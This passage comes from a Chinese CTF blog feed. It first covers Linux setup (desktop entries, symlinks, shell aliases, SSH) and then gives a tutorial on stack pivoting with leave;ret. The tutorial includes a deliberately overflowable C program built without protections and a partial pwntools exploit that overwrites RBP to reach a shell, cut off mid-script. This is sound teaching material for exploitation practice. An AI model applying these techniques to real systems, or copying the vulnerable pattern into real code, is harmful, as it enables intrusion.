Desktop 文件都以这个标签开始</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Version</code></td><td align="left">标明 Desktop Entry 的版本</td><td align="left">可选</td></tr><tr><td align="left"><code>Type</code></td><td align="left">Desktop 的类型, 常见值有 Application 和 Link</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Name</code></td><td align="left">程序名称，可自定义</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Comment</code></td><td align="left">程序描述，可自定义</td><td align="left">可选</td></tr><tr><td align="left"><code>Icon</code></td><td align="left">设置快捷方式的图标，支持 png 和 svg</td><td align="left">可选</td></tr><tr><td align="left"><code>Exec</code></td><td align="left">程序的启动命令, 可以带参数运行, 当 Type 为 Application 时有效</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Terminal</code></td><td align="left">是否在终端中运行, 当 Type 为 Application 时有效 <em>（对于没有图形界面的程序很有用）</em></td><td align="left">可选</td></tr><tr><td align="left"><code>MimeType</code></td><td align="left">设置该程序可以打开的文件类型</td><td align="left">可选</td></tr><tr><td align="left"><code>StartupNotify</code></td><td align="left">程序启动通知</td><td align="left">可选</td></tr></tbody></table><p>其他 <code>MimeType</code> 可打开的文件类型：<a href="https://blog.csdn.net/zhaoyw2008/article/details/46647723">完整的 mime type 列表-CSDN博客</a></p><p>增加执行权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> +x IDA-Freeware-8.2.desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后将 .desktop 文件存放到 <code>/usr/share/applications/</code> 目录下</p><p>程序就会现在开始菜单中，同时也可以在 <code>右键 -&gt; 使用其他应用程序打开</code> 中找到，然后也可以自己将应用固定到任务栏，方便打开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/桌面<span class="token function">sudo</span> <span class="token function">mv</span> IDA-Freeware-8.2.desktop /usr/share/applications/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>jetbrains 全家桶等等创建桌面快捷方式就简单了，运行软件后：<code>工具栏 –&gt; Tools –&gt; Create Desktop Entery</code></p><p>以 Pycharm 自动创建的图标为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Version</span><span class="token operator">=</span><span class="token number">1.0</span><span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Name</span><span class="token operator">=</span>PyCharm Professional Edition<span class="token assign-left variable">Icon</span><span class="token operator">=</span>/opt/pycharm-2022.3/bin/pycharm.svg<span class="token assign-left variable">Exec</span><span class="token operator">=</span><span class="token string">"/opt/pycharm-2022.3/bin/pycharm.sh"</span> %f<span class="token assign-left variable">Comment</span><span class="token operator">=</span>Python IDE <span class="token keyword">for</span> Professional Developers<span class="token assign-left variable">Categories</span><span class="token operator">=</span>Development<span class="token punctuation">;</span>IDE<span class="token punctuation">;</span><span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">StartupWMClass</span><span class="token operator">=</span>jetbrains-pycharm<span class="token assign-left variable">StartupNotify</span><span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="创建软连接将应用添加到终端启动"><a href="#创建软连接将应用添加到终端启动" class="headerlink" title="创建软连接将应用添加到终端启动"></a>创建软连接将应用添加到终端启动</h2><blockquote><p>这里以 IDA Freeware 8.2 为例，因为我 Ubuntu 22.04 安装的是 IDA Freeware 8.2，但是 <strong>Ubuntu 16.04 貌似不支持这么新的版本，会无法运行，所以这里主要演示如何创建软连接将应用添加到终端启动，建议不要安装太高版本的 IDA</strong></p></blockquote><p>以 IDA 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> <span class="token string">"/opt/idafree-8.2/ida64"</span> /usr/bin/ida<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样在终端输入 <code>ida</code> 即可打开 IDA</p><blockquote><p><code>/usr/bin/ida</code> 中的 ida 名字可以自定义</p><p>这样只是在 <code>/usr/bin/</code> 下创建了一个软链接，指向 <code>/opt/idafree-8.2/ida64</code><br>若想删除软链接：</p><pre class="line-numbers language-none"><code class="language-none">unlink 软链接<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尽量不要用 <code>rm -rf</code> 删除软链接，如果不小心加上 <code>&#39;/&#39;</code> 就会删除源文件，例如：<code>rm -rf filename/</code></p></blockquote><hr><h2 id="终端将-cd-命令与-ls-命令连用"><a href="#终端将-cd-命令与-ls-命令连用" class="headerlink" title="终端将 cd 命令与 ls 命令连用"></a>终端将 cd 命令与 ls 命令连用</h2><blockquote><p>其实就是将 <code>cd xxx</code> 命令变为 <code>cd xxx &amp;&amp; ls</code>，好处也显而易见：可以少敲一条命令，方便~</p><p>但是 Ubuntu 不支持 <code>chdir</code>，所以不能直接用 <code>alias</code> 实现目录内容的显示</p></blockquote><p>注：以下操作对 Kali Linux 同样适用</p><p>如果你的 Ubuntu 配置了 zsh 终端，编辑 <code>~/zshrc</code> 配置文件（Kali Linux 自带 zsh 终端）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span class="token comment"># 如果没有配置 zsh 终端，则打开 ~/.bashrc</span><span class="token function">sudo</span> gedit ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在文件最后加入以下内容，保存退出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cd</span><span class="token operator">=</span>cdls<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-name function">cdls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">builtin</span> <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span class="token comment"># 如果没有配置 zsh 终端，则使用如下命令</span><span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以看到效果了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA29.png" alt="Linux虚拟机CTF环境搭建29.png"></p><p>如果想顺便显示当前所在路径，只需将前面的内容改为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cd</span><span class="token operator">=</span>cdls<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-name function">cdls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">builtin</span> <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">pwd</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以看到效果了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA30.png" alt="Linux虚拟机CTF环境搭建30.png"></p><hr><h2 id="配置-SSH-服务端"><a href="#配置-SSH-服务端" class="headerlink" title="配置 SSH 服务端"></a>配置 SSH 服务端</h2><blockquote><p>Linux 默认只安装了 SSH 客户端，有时候在执行 ssh 或者 scp 命令时会出现：<code>ssh: connect to host port 22: Connection refused</code> 拒绝连接</p><p>客户端和服务端的关系：<br>如果 A 机器想被 B 机器远程控制，那么 A 机器需要安装 SSH 服务端，B 机器需要安装 SSH 客户端<br>例如：B 机器通过 ssh 连接 A 机器，或者 B 机器通过 scp 上传文件到 A 机器</p></blockquote><p>查看 ssh 服务：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只显示有 openssh-client 没有 openssh-server，说明未安装 SSH 服务端</p><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssh-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>确认 ssh-server 是否启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果看到 <code>sshd</code> 就说明 ssh-server 已经启动</p><p>如果出现其他问题的话，查看 SSH 服务端状态：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> <span class="token function">ssh</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启 SSH 服务端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相关命令：</p><ul><li>连接服务端机器，假设 IP 为 192.168.1.1，用户名为 user （Windows、Linux 通用）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> user@192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>从客户端机器上传当前目录下的 test 文件到服务端机器的 <code>~/</code> 或 <code>E:\</code> 目录下，假设 IP 为 192.168.1.1，用户名为 user</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 服务端为 Linux</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token builtin class-name">test</span> user@192.168.1.1:~/<span class="token comment"># 服务端为 Windows</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token builtin class-name">test</span> user@192.168.1.1:E:<span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实只传文件的话，不需要 <code>-r</code> 参数，但是传文件夹需要，索性直接加上 <code>-r</code> 更方便</p><p>如果使用 ssh 连接出现如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED<span class="token operator">!</span>     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY<span class="token operator">!</span>Someone could be eavesdropping on you right now <span class="token punctuation">(</span>man-in-the-middle attack<span class="token punctuation">)</span><span class="token operator">!</span>It is also possible that a <span class="token function">host</span> key has just been changed.<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>Host key verification failed.lost connection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此报错是由于远程的主机的公钥发生了变化导致的</p><p>解决办法：<br>清除 ssh 所连接的 IP</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-R</span> 出问题的IP地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再使用 ssh 重新连接即可</p><hr>]]></content>
      
      
      <categories>
          
          <category> Linux环境 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Pwn </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>栈迁移</title>
      <link href="/posts/92acfead.html"/>
      <url>/posts/92acfead.html</url>
      
        <content type="html"><![CDATA[<h1 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h1><blockquote><p>一般看见只能溢出到 RBP 和 <code>ret_addr</code> 的题，基本就是栈迁移了，其实就是当栈空间不够构造 ROP 链时将栈迁移到别的地方去构造 ROP 链</p><p><strong>注意：要想实现栈迁移，至少要能溢出覆盖 RBP</strong></p><p><strong>要利用栈迁移来实现 ROP，关键就在于 <code>leave; ret</code> 这两个指令</strong></p><p>如果对函数的执行、函数调用栈不太熟悉，可以看看本站《<a href="%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88.md">函数调用栈</a>》这篇文章</p></blockquote><p><code>leave</code> 和 <code>ret</code> 指令一般位于汇编函数的末尾，<code>leave</code> 的功能可以等价为：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">mov esp<span class="token punctuation">,</span> ebp  <span class="token comment">; 恢复栈指针</span>pop ebp       <span class="token comment">; 恢复基址指针</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><code>ret</code> 则等价为：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">pop eip <span class="token comment">; 这样写是方便理解，实际上不存在 pop eip 这个汇编指令</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><em>既然栈迁移是将栈迁移到其他地方，那么肯定要对栈指针做手脚了</em></p></blockquote><p>正常来说，汇编函数结束后，一个 <code>leave; ret</code> 即可恢复正常的执行流，让程序返回到调用该函数的那个函数中</p><p>那如果我们在汇编函数执行 <code>leave; ret</code> 后，再执行一次 <code>leave; ret</code> 会发生什么呢？</p><hr><h1 id="栈迁移的应用场景"><a href="#栈迁移的应用场景" class="headerlink" title="栈迁移的应用场景"></a>栈迁移的应用场景</h1><blockquote><p><strong>注意，学习这里必须要分清：地址、地址中存放的值，这两者是不一样的，不然容易懵</strong></p><p><strong>就像 C 语言中指针 p 指向一个内存单元，也就是一个地址；而 <code>*p</code> 指的是这个内存单元中存放的数据，是一个值</strong></p><p>因为涉及 <code>pop ebp</code> 指令，所以先解释一下：</p><p>EBP 是一个基址指针寄存器，通常它的值是一个地址，所以可以理解为是一个指向该地址的指针，一般用于指向栈底</p><p>但是 EBP 指向的这个地址中，也是可以存放数据的（这个数据的值一般是曾经的 EBP 所指向的那个地址），所以要区分：EBP 指向的地址、EBP 指向的地址中存放的数据</p></blockquote><hr><h2 id="可以覆盖到返回地址"><a href="#可以覆盖到返回地址" class="headerlink" title="可以覆盖到返回地址"></a>可以覆盖到返回地址</h2><blockquote><p>输入的长度可以溢出到 <code>ret_addr</code>，但是不够构造 ROP 链怎么办？</p></blockquote><p>接下来，我们以一个 32 位程序的例子来展示栈迁移的第一个作用</p><p>假设初始时栈空间如下（ESP ~ EBP 之间的区域）：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB1.png" alt="CTF - Pwn_栈迁移1.png"></p><blockquote><p>注意，在上图的栈中：</p><p>红色的内存单元：EBP 曾经、现在、以后指向的位置（EBP 所在的位置决定了栈在哪里）<br>绿色的内存单元：EBP 下方的返回地址，也就是 <code>ret</code> 指令执行时 ESP 所在的位置<br>黄色的内存单元：栈空间<br>白色的内存单元：里面的内容不重要，无视就行</p></blockquote><p>初始时，EBP 指向栈底 <code>0xffffce00</code> 地址处，该地址处存放着 <code>0xffffce28</code> 这个值（也就是曾经的栈底地址，在图中也可以看的很清楚）</p><p>返回地址 <code>0xffffce04</code> 处存放着函数 func_1 中某条指令 cmd_1 的地址，那么程序最终会返回到函数 func_1 中 cmd_1 这条指令的下一条指令处继续执行</p><blockquote><p>注意：实现栈迁移需要 2 次 <code>leave; ret</code> 指令</p><p>而函数正常结束只有一次 <code>leave; ret</code> 指令，因此我们需要将函数的返回地址处改为 <code>leave; ret</code> 指令所在的地址，这样在函数结束后，能够再执行一次 <code>leave; ret</code> 指令</p></blockquote><p>现在我们来分析一下，如果我们将返回地址 <code>0xffffce04</code> 处的内容覆盖掉，改成 <code>leave; ret</code> 指令的地址，同时将 EBP 改为我们想要迁移过去的地方（假设是 <code>0xffffcdc8</code>），看看会发生什么？</p><p>当执行到 <code>leave; ret</code> 指令时：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB2.png" alt="CTF - Pwn_栈迁移2.png"></p><p>当最后的 ret 指令执行后，<code>esp + 4</code> 使 ESP 下移一格到 <code>0xffffce08</code> 地址处</p><p>然后程序会到 <code>leave; ret</code> 指令所在的地址处执行 <code>leave; ret</code> 指令，过程如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB3.png" alt="CTF - Pwn_栈迁移3.png"></p><p>我们发现，在经历 <code>pop ebp</code> 后，EBP 指向的地址是未知的</p><p>因为我们并没有人为去更改 <code>0xffffcdc8</code> 地址处存放的内容，所以 EBP 最终指向了哪里取决于 <code>0xffffcdc8</code> 地址处原本的内容是什么，但这不是我们关注的重点，因此就当 EBP 指向了一个未知的地址</p><p>重要的是，在经历 <code>pop ebp</code> 后，<code>esp + 4</code> 使 ESP 下移一格，ESP 指向了地址 <code>0xffffcdcc</code> 处，然后会执行一次 <code>ret</code> 指令</p><p>也就是说，我们其实可以将 ESP 指向的 <code>0xffffcdcc</code> 地址处看成是新的返回地址</p><p><em>到这里，相信你应该已经知道这样做意味着什么了吧？</em></p><p><strong>相当于我们将原来的栈的返回地址迁移到了 <code>0xffffcdcc</code> 这个地方，由于程序之前的返回地址被我们修改了，自然就无法正常返回到之前的 func_1 函数，那么程序的整个执行流将由我们控制</strong></p><p><strong>我们直接将 ROP 链写在 <code>0xffffcdcc</code> 这个地址后面即可，就不需要担心写入空间不够了</strong></p><blockquote><p>总结一下：</p><ol><li>首先，我们需要将当前的 EBP 覆盖为新的目标地址 <code>target_addr</code>，那么 <code>target_addr - 4</code> 的位置就是新的返回地址。而这个 <code>target_addr</code> 怎么选就视情况而定了，但是有两点是必须的：</li></ol><p>① <code>target_addr</code> 这个地址必须是已知的，由于栈的地址通常是未知的，除非存在格式化字符串漏洞的话可以泄露出来，因此优先选择 BSS 段的空间</p><p>② <code>target_addr</code> 所在的区域必须是可写的，要有可写入权限，看似是废话，但是很关键，一般栈空间都是可写的，但 BSS 段不一定</p><ol start="2"><li>其次，我们要将当前栈的返回地址覆盖为 <code>leave; ret</code> 指令所在的地址，注意是指令所在的地址，不是 <code>leave; ret</code> 这个字符串！因此又分两种情况：</li></ol><p>① 程序中直接有 <code>leave; ret</code> 指令，且真实地址很容易得到，那就没什么好说的了，不过这个指令涉及到函数的返回所以一般都会有的，也可以用指令搜索：<code>ROPgadget --binary 二进制程序 --only &#39;leave|ret&#39;</code></p><p>② 另一种方法，就是在具备写入权限的情况下，利用程序的输入自己写 <code>leave; ret</code> 指令，优先写到 BSS 段这种地址容易得到的地方，当然写到栈里然后想办法泄露出真实地址也是可以的</p></blockquote><p>相关例题见《<a href="%E3%80%90HDCTF%202023%E3%80%91KEEP%20ON.md">【HDCTF 2023】KEEP ON</a>》</p><hr><h2 id="只能覆盖到-RBP"><a href="#只能覆盖到-RBP" class="headerlink" title="只能覆盖到 RBP"></a>只能覆盖到 RBP</h2><blockquote><p>输入的长度只能溢出到 RBP，连返回地址都够不到怎么办？</p></blockquote><p>接下来，我们以一个 64 位程序的例子来展示栈迁移的第二个作用</p><p><strong>如果只能溢出到 RBP，无法覆盖返回地址，那当然就没办法控制程序的执行流了，但是不是就没有其他作用了呢？</strong></p><p>这个用法的基础在于对汇编语言的理解，例如下面的代码：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> v6 <span class="token operator">=</span> <span class="token number">0x999</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">func_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"give me your input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">init_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">func_1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"now crack me!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%ld"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>v6 <span class="token operator">==</span> <span class="token number">2024</span><span class="token punctuation">)</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// gcc -fno-stack-protector mytest.c -no-pie -o mytest</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们编译后，程序保护为：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB6.png" alt="CTF - Pwn_栈迁移6.png"></p><p>在 IDA 里查看：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB4.png" alt="CTF - Pwn_栈迁移4.png"></p><p>可以看到 <code>buf</code> 在 <code>rbp - 20h</code> 的地方，而我们只能输入 0x28 的长度，刚好覆盖 RBP</p><p>主函数：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB7.png" alt="CTF - Pwn_栈迁移7.png"></p><p>我们的目的是要修改 <code>v6</code> 的值为 2024，执行 <code>system(&quot;/bin/sh&quot;)</code></p><p><code>v6</code> 作为全局变量，值为 0x999，可以看到 <code>v6</code> 位于 DATA 段：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB5.png" alt="CTF - Pwn_栈迁移5.png"></p><p>现在 <code>buf</code> 的溢出无法覆盖返回地址，<code>scanf()</code> 输入的是 <code>v4</code>，也改变不了 <code>v6</code></p><p>那怎么办呢？</p><p>我们来看看<code>scanf()</code> 的汇编：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB8.png" alt="CTF - Pwn_栈迁移8.png"></p><p>在 C 语言中，<code>scanf()</code> 会让我们输入一个数据，这个数据存在哪里呢？</p><p>在 64 位程序中，<code>scanf()</code> 输入的数据会存放在 RSI 寄存器中</p><p>但是，我们输入的数据应该是存放在栈上的，那这个 RSI 寄存器中的数据到底从哪来呢？</p><p>通过汇编我们可以看出：</p><pre class="line-numbers language-armasm" data-language="armasm"><code class="language-armasm">lea     rax<span class="token punctuation">,</span> <span class="token punctuation">[</span>rbp<span class="token operator">+</span>var_4<span class="token punctuation">]</span>mov     rsi<span class="token punctuation">,</span> rax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>程序首先会通过寻址将 <code>rbp + var_4</code> 这个地址处的值取出存放到 RAX 寄存器，然后由 RAX 寄存器送入 RSI 寄存器，而这个 <code>var_4</code> 实际就只是一个偏移量：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Pwn_%E6%A0%88%E8%BF%81%E7%A7%BB9.png" alt="CTF - Pwn_栈迁移9.png"></p><p>因此，<code>scanf()</code> 输入的数据最终确实存放在 RSI 寄存器，但这个数据具体是从哪里去取的，取决于 RBP 的位置，因为是根据 <code>rbp + var_4</code> 去寻址的</p><p><em>到这里，相信你应该已经知道我们该怎么做了吧？</em></p><p>如果我们将 <code>rbp + var_4</code> 迁移到 <code>v6</code> 所在的 DATA 段地址（这里 RBP 的迁移是通过 <code>func_1()</code> 自己的 <code>leave</code> 指令来实现的），不就可以通过 <code>scanf()</code> 的输入将 <code>v6</code> 的值修改掉吗？</p><p>因此构造 exp 如下：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./mytest"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span>v6_addr <span class="token operator">=</span> <span class="token number">0x404050</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>v6_addr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'give me your input:\n'</span><span class="token punctuation">)</span><span class="token comment"># debug()</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'now crack me!\n'</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2024"</span><span class="token punctuation">)</span><span class="token comment"># 与远程交互</span>io<span class="token 